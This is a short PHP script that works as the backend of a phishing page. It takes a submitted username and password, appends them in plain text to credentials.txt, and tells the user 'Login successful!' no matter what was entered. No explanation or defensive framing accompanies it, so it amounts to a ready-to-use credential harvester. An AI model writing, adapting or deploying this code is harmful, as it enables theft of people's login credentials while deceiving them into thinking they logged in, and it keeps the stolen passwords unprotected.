<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Store the credentials in a text file
file_put_contents('credentials.txt', "Username: $username, Password: $password\n", FILE_APPEND);
echo "Login successful!"; // You can customize this message
?>
